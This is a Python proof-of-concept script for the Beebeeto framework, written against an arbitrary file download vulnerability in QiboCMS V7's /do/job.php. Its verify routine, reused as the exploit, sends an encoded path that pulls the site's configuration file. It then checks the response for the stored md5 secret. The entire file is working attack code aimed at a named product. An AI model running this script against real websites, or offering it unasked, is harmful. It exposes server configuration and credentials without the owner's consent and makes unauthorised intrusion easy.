#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib
import urllib2

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {  
          # poc相关信息  
          'poc': {  
              'id': 'poc-2015-0020',
              'name': 'QiboCMS V7 /do/job.php 任意文件下载漏洞 POC',
              'author': 'xiao8bs',
              'create_date': '2015-01-28',
          },  
          # 协议相关信息  
          'protocol': {  
              'name': 'http',
              'port': [80],
              'layer4_protocol': ['tcp'],
          },  
          # 漏洞相关信息  
          'vul': {  
              'app_name': 'Qibo',
              'vul_version': ['V7',], 
              'type': 'Arbitrary File Download',
              'tag': ['Qibo任意文件下载漏洞', '/do/job.php', 'filedown', 'php'],
              'desc': 'Qibo V7 has File down in do/job.php.',
              'references': ['N/A', 
              ],  
          },  
    }

    @classmethod
    def verify(cls, args):
        payload = 'job=download&url=ZGF0YS9jb25maWcucGg8'
        verify_url = args['options']['target'] + '/do/job.php?%s' % payload
        request = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        response = urllib2.urlopen(request)
        reg = re.compile("webdb\['mymd5'\]")
        if reg.findall(response.read()):
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        else:
            args['success'] = False
        return args

    exploit = verify
    
if __name__ == '__main__':
    from pprint import pprint
    
    mp = MyPoc()
    pprint(mp.run())